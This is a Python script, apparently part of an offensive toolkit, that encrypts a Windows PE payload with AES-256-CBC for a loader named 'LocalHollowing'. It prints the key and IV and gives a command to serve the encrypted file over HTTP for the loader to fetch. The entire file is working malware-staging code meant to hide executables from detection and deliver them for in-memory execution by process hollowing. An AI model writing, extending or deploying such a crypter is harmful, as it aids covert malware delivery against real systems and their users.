#!/usr/bin/env python3
"""
Payload Encryptor - AES-256-CBC
Encrypts native PE with AES-256-CBC. Key = SHA-256(passphrase).

Usage:
    python encrypt.py <payload.exe> <passphrase> [-o output_dir]
"""

import os
import sys
import hashlib
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_payload(input_path, passphrase, output_dir="."):
    with open(input_path, "rb") as f:
        plaintext = f.read()

    print(f"[*] Input: {input_path} ({len(plaintext)} bytes)")

    key = hashlib.sha256(passphrase.encode("utf-8")).digest()
    iv = os.urandom(16)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    output_data = iv + ciphertext

    base_name = os.path.splitext(os.path.basename(input_path))[0]
    output_path = os.path.join(output_dir, f"{base_name}.bin")

    os.makedirs(output_dir, exist_ok=True)
    with open(output_path, "wb") as f:
        f.write(output_data)

    print(f"[+] Output: {output_path} ({len(output_data)} bytes)")
    print(f"[+] Key (SHA-256): {key.hex()}")
    print(f"[+] IV: {iv.hex()}")
    print(f"[*] Serve with: cd {output_dir} && python3 -m http.server 8080")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypt native PE for LocalHollowing")
    parser.add_argument("payload", help="Path to native PE (.exe)")
    parser.add_argument("passphrase", help="Encryption passphrase")
    parser.add_argument("-o", "--output", default="payload", help="Output directory")
    args = parser.parse_args()

    if not os.path.isfile(args.payload):
        print(f"[-] File not found: {args.payload}")
        sys.exit(1)

    encrypt_payload(args.payload, args.passphrase, args.output)
